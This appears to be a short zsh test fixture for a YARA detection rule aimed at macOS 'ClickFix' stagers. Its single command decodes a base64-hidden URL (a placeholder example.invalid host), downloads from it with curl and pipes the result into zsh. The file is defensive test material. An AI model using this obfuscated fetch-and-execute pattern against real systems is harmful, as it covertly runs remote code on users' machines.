#!/bin/zsh
# Inert YARA fixture for CERBER_MacOS_ClickFix_Hidden_URL_Stager - text only, not a working sample.
curl -kfsSL $(echo 'aHR0cDovL2V4YW1wbGUuaW52YWxpZC94'|base64 -D)|zsh
